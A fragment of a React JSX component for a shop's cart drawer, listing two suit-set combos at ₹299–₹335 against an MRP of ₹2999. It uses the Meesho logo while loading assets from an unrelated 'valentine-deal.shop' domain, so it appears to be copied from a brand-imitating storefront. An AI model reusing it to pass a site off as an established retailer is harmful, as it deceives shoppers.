0-2.081-.112-3.146-.34-1.065-.228-2.206-.63-3.418-1.208-.488-.242-.936-.318-1.347-.228-.412.09-.747.29-1.002.59-.26.305-.412.662-.457 1.074a2.24 2.24 0 0 0 .228 1.23c.197.412.542.77 1.025 1.07 1.154.671 2.46 1.14 3.92 1.414 1.458.273 2.84.411 4.147.411 2.886 0 5.199-.63 6.93-1.892 1.732-1.262 2.6-3.002 2.6-5.222 0-1.642-.51-2.948-1.526-3.919-1.011-.957-2.51-1.624-4.483-1.99ZM125.603 12.32c-1.155-.666-2.631-1.002-4.421-1.002-1.794 0-3.396.416-4.81 1.253a7.254 7.254 0 0 0-2.483 2.443V4.437c0-.944-.25-1.656-.751-2.143-.501-.488-1.208-.73-2.121-.73s-1.611.242-2.099.73c-.487.487-.729 1.199-.729 2.143v27.082c0 .944.242 1.664.729 2.165.488.501 1.186.752 2.099.752 1.915 0 2.872-.97 2.872-2.917v-9.986c0-1.732.492-3.123 1.481-4.17.989-1.047 2.318-1.575 3.991-1.575 1.369 0 2.38.393 3.034 1.185.653.792.979 2.054.979 3.786v10.76c0 .944.251 1.664.752 2.165.501.501 1.208.752 2.121.752s1.611-.25 2.098-.752c.488-.5.729-1.221.729-2.165V20.486c0-2.067-.29-3.777-.867-5.128-.582-1.355-1.446-2.367-2.604-3.038ZM150.618 12.642c-1.7-.944-3.709-1.413-6.018-1.413-1.731 0-3.297.268-4.698.796-1.396.532-2.599 1.306-3.601 2.326-1.003 1.02-1.772 2.233-2.305 3.647-.532 1.414-.796 3.015-.796 4.81 0 2.37.47 4.429 1.414 6.178.939 1.75 2.264 3.092 3.968 4.036 1.701.944 3.709 1.414 6.018 1.414 1.732 0 3.297-.269 4.698-.797 1.396-.532 2.599-1.306 3.602-2.326 1.002-1.02 1.771-2.242 2.304-3.669.532-1.427.796-3.038.796-4.832 0-2.371-.47-4.42-1.414-6.156-.944-1.736-2.264-3.074-3.968-4.014Zm-1.07 14.201c-.469 1.079-1.132 1.893-1.982 2.439-.85.546-1.838.818-2.961.818-1.701 0-3.07-.613-4.103-1.847-1.034-1.23-1.548-3.047-1.548-5.45 0-1.61.237-2.957.707-4.036.469-1.078 1.132-1.883 1.982-2.416.85-.532 1.839-.796 2.962-.796 1.7 0 3.069.6 4.102 1.799 1.034 1.199 1.548 3.015 1.548 5.45 0 1.614-.237 2.961-.707 4.04ZM15.512 34.431c-1.387 0-2.555-1.167-2.555-2.554V20.18c.013-2.165-1.79-3.915-3.924-3.879-2.134-.036-3.932 1.718-3.924 3.88v11.695a2.557 2.557 0 0 1-2.554 2.554C1.18 34.431 0 33.246 0 31.877V20.22a8.993 8.993 0 0 1 2.649-6.389 8.998 8.998 0 0 1 6.384-2.648 9.012 9.012 0 0 1 6.483 2.742A8.997 8.997 0 0 1 22 11.184a8.982 8.982 0 0 1 6.385 2.648 9.008 9.008 0 0 1 2.649 6.39v11.654c0 1.37-1.181 2.555-2.555 2.555a2.557 2.557 0 0 1-2.555-2.554V20.18c.014-2.165-1.79-3.915-3.924-3.879-2.134-.036-3.932 1.718-3.923 3.88v11.695c-.01 1.387-1.177 2.554-2.564 2.554Z" fill="#570D48"></path></g><defs><clipPath id="meeshoLogo_svg__a"><rect width="100%" height="100%" fill="#fff"></rect></clipPath></defs></svg>
                            </div>
                                <h3 className="ui2-heading">
                                    <span>
                                        <b>Your Cart</b>
                                    </span>
                                </h3>
                                <a href="javascript:void(0)" className="closebtn" onclick="closeNav()">
                                    ×
                                </a>
                            </div>
                        </div>
                        <div className="cart-products-list">
                            <div className="cart-product cart-product-index-0">
                                {" "}
                                <div className="cart-product-img">
                                    {" "}
                                    <img
                                        src="https://img.myshopline.com/image/store/1704689667447/Untitleddesign-33a560e5-6897-4b88-ad92-96bc756f6d57.png?w=1080&h=1080"
                                        alt=""
                                    />{" "}
                                </div>{" "}
                                <div className="cart-product-details">
                                    {" "}
                                    <div className="cart-product-title">
                                        {" "}
                                        <p>COMBO OF 3 SUIT SETS 3</p>{" "}
                                        <img
                                            src="https://cdn.shopify.com/s/files/1/0057/8938/4802/files/Group_1_93145e45-8530-46aa-9fb8-6768cc3d80d2.png?v=1633783107"
                                            className="remove-cart-item"
                                            data-index={0}
                                            alt=""
                                        />{" "}
                                    </div>{" "}
                                    <div className="cart-product-pricing">
                                        {" "}
                                        <p className="cart-product-price">₹335</p>&nbsp;{" "}
                                        <span className="cart-product-mrp">₹2999</span>{" "}
                                    </div>{" "}
                                    <div className="cart-product-description">
                                        {" "}
                                        <p className="cart-product-color">Size :S</p>{" "}
                                        <span className="sc-lbxAil evmCQI" />{" "}
                                        <div className="cart-qty-wrapper">
                                            {" "}
                                            <span className="minus" data-index={0}>
                                                -
                                            </span>{" "}
                                            <span className="num">01</span>{" "}
                                            <span className="plus" data-index={0}>
                                                +
                                            </span>{" "}
                                        </div>{" "}
                                    </div>{" "}
                                </div>{" "}
                            </div>
                            <div className="cart-product cart-product-index-1">
                                {" "}
                                <div className="cart-product-img">
                                    {" "}
                                    <img
                                        src="https://img.myshopline.com/image/store/1704689667447/Untitleddesign-a84dd8a5-e871-49f4-ac09-2527b52bace4.png?w=1080&h=1080"
                                        alt=""
                                    />{" "}
                                </div>{" "}
                                <div className="cart-product-details">
                                    {" "}
                                    <div className="cart-product-title">
                                        {" "}
                                        <p>COMBO OF 3 SUIT SETS 1</p>{" "}
                                        <img
                                            src="https://cdn.shopify.com/s/files/1/0057/8938/4802/files/Group_1_93145e45-8530-46aa-9fb8-6768cc3d80d2.png?v=1633783107"
                                            className="remove-cart-item"
                                            data-index={1}
                                            alt=""
                                        />{" "}
                                    </div>{" "}
                                    <div className="cart-product-pricing">
                                        {" "}
                                        <p className="cart-product-price">₹299</p>&nbsp;{" "}
                                        <span className="cart-product-mrp">₹2999</span>{" "}
                                    </div>{" "}
                                    <div className="cart-product-description">
                                        {" "}
                                        <p className="cart-product-color">Size :S</p>{" "}
                                        <span className="sc-lbxAil evmCQI" />{" "}
                                        <div className="cart-qty-wrapper">
                                            {" "}
                                            <span className="minus" data-index={1}>
                                                -
                                            </span>{" "}
                                            <span className="num">01</span>{" "}
                                            <span className="plus" data-index={1}>
                                                +
                                            </span>{" "}
                                        </div>{" "}
                                    </div>{" "}
                                </div>{" "}
                            </div>
                        </div>
                        <div className="cart__footer" style={{}}>
                            <div className="cart__price__details">
                                <div className="cart__breakup__inner">
                                    <div className="cart__total">
                                        <span className="">Cart Total:</span>
                                        <span className="cartTotalAmount">₹634.00</span>
                                    </div>
                                    <div
                                        className="shipping__total"
                                        style={{ borderBottom: "1px dashed #000" }}
                                    >
                                        <span className="">Shipping:</span>
                                        <span className="">FREE</span>
                                    </div>
                                    <div className="mc_pay__total">
                                        <span className="">To Pay:</span>
                                        <span className="cartTotalAmount">₹634.00</span>
                                    </div>
                                </div>
                            </div>
                            <div className="cart__checkout">
                                <div className="cart__final__payment">
                                    <h2 className="cart__final__price cartTotalAmount">₹634.00</h2>
                                    <p className="cart__tax__text">Inclusive of all taxes</p>
                                </div>
                                <a
                                    href="/cart"
                                    className="btn btn-dark cart__confirm__order"
                                >
                                    Confirm Order
                                </a>
                            </div>
                        </div>
                    </div>
                    <style
                        dangerouslySetInnerHTML={{
                            __html:
                                "\n                    .steps.svelte-idjy9v .steps-inner .step.active .info-wrap .circle-box.svelte-idjy9v {\n                        border-color: #000000;\n                        color: #000000;\n                        background: #fff;\n                    }\n\n\n                    .steps.svelte-idjy9v .steps-inner .step.active .info-wrap .title.svelte-idjy9v {\n                        color: #000000;\n                    }\n\n                    .steps.svelte-idjy9v .steps-inner .step.svelte-idjy9v:last-child {\n                        justify-content: center;\n                    }\n\n                    .steps.svelte-idjy9v.svelte-idjy9v {\n                        padding: 2.3rem 1.2rem 0.5rem;\n\n                    }\n\n                    ._2dxSCm .search-div:before {\n                        background: url('https://kurti.valentine-deal.shop/assets/images/theme/search.svg');\n                    }\n                "
                        }}
                    />
                    <use-chat-gpt-ai-content-menu id="USE_CHAT_GPT_AI_ROOT_Context_Menu" />
                    <use-chat-gpt-ai
                        id="USE_CHAT_GPT_AI_ROOT"
                        data-version="3.0.0"
                        style={{ display: "none" }}
                    />
                    <max-ai-minimum-app
                        id="USE_CHAT_GPT_AI_ROOT_Minimize_Container"
                        data-version="3.0.0"
                    />
                    <div
                        id="MAXAI_SNACKBAR_CONTAINER"
                        style={{ zIndex: 2147483647, color: "rgb(255, 255, 255)" }}
                    />
                </>
            </div>
        </Layout >
    );
};

export default Address;
